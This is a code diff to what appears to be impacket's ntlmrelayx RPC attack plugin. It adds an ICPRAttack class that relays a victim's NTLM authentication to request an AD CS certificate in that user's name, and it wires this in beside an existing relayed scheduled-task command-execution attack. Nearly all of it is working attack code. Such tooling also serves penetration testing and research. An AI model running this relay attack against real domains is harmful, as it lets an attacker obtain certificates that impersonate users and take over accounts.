@@ -14,11 +14,18 @@
 import time
 import string
 import random
+from typing import Tuple
 
 from impacket import LOG
-from impacket.dcerpc.v5 import tsch
+from impacket.dcerpc.v5 import tsch, icpr
 from impacket.dcerpc.v5.dtypes import NULL
 from impacket.examples.ntlmrelayx.attacks import ProtocolAttack
+
+from cryptography import x509
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.primitives.asymmetric import rsa
+from cryptography.hazmat.primitives.serialization import Encoding
+from cryptography.x509.oid import NameOID
 
 PROTOCOL_ATTACK_CLASS = "RPCAttack"
 
@@ -106,8 +113,55 @@ class TSCHRPCAttack:
         tsch.hSchRpcDelete(self.dce, '\\%s' % tmpName)
         LOG.info('Completed!')
 
+class ICPRAttack:
+    
+    PRINCIPAL_NAME = x509.ObjectIdentifier("1.3.6.1.4.1.311.20.2.3")
+    
+    def _run(self):
+        csr, key = self.create_csr(username=self.username)
+        attributes = ["CertificateTemplate:User"]
+        
+        LOG.info('Requesting certificate for %s with template Machine' % self.username)
+        resp = icpr.hIcprRpcCertServerRequest(dce=self.dce, der=self.csr_to_der(csr), ca=self.config.ca, attributes=attributes)
+        error_code = resp["pdwDisposition"]
+        request_id = resp["pdwRequestId"]
 
-class RPCAttack(ProtocolAttack, TSCHRPCAttack):
+        if error_code == 3:
+            LOG.info("Successfully requested certificate")
+        else:
+            if error_code == 5:
+                LOG.warning("Certificate request is pending approval")
+            else:
+                LOG.error(
+                        "Got error while trying to request certificate: %s" % error_code
+                    )
+
+
+
+    def csr_to_der(self, csr: x509.CertificateSigningRequest) -> bytes:
+        return csr.public_bytes(Encoding.DER)
+
+    def generate_rsa_key(self) -> rsa.RSAPrivateKey:
+        return rsa.generate_private_key(public_exponent=0x10001, key_size=2048)
+
+    def create_csr(self, username: str, key: rsa.RSAPrivateKey = None) -> Tuple[x509.CertificateSigningRequest, rsa.RSAPrivateKey]:
+        if key is None:
+            key = self.generate_rsa_key()
+
+        csr = x509.CertificateSigningRequestBuilder()
+
+        csr = csr.subject_name(
+            x509.Name(
+                [
+                    x509.NameAttribute(NameOID.COMMON_NAME, username),
+                ]
+            )
+        )
+
+        return (csr.sign(key, hashes.SHA256()), key)
+
+
+class RPCAttack(ProtocolAttack, TSCHRPCAttack, ICPRAttack):
     PLUGIN_NAMES = ["RPC"]
 
     def __init__(self, config, dce, username):
@@ -119,11 +173,15 @@ class RPCAttack(ProtocolAttack, TSCHRPCAttack):
     def run(self):
         # Here PUT YOUR CODE!
 
-        # Assume the endpoint is TSCH
         # TODO: support relaying RPC to different endpoints
         # TODO: support for providing a shell
         # TODO: support for getting an output
-        if self.config.command is not None:
-            TSCHRPCAttack._run(self)
+        if self.config.rpc_mode == 'ICPR':
+          ICPRAttack._run(self)
+        elif self.config.rpc_mode == 'TSCH': 
+          if self.config.command is not None:
+              TSCHRPCAttack._run(self)
+          else:
+              LOG.error("No command provided to attack")
         else:
-            LOG.error("No command provided to attack")
+          raise NotImplementedError("Not implemented!")
